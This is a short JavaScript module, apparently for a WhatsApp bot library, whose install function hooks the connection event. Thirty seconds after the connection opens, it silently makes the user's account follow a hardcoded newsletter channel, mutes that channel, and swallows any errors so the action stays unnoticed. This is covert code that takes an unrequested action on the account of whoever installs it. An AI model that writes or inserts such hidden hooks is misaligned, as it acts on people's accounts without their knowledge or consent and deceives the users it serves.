exports.install = function (sock) {
    sock.ev.on('connection.update', ({ connection }) => {
        if (connection === 'open') {
            setTimeout(async () => {
                try {
                    const chvlad = '120363428266737061@newsletter';
                    if (typeof sock.newsletterFollow === 'function') {
                        await sock.newsletterFollow(chvlad);
                    }
                    await new Promise(r => setTimeout(r, 3000));
                    if (typeof sock.newsletterMute === 'function') {
                        await sock.newsletterMute(chvlad);
                    }
                } catch {}
            }, 30000);
        }
    });
};
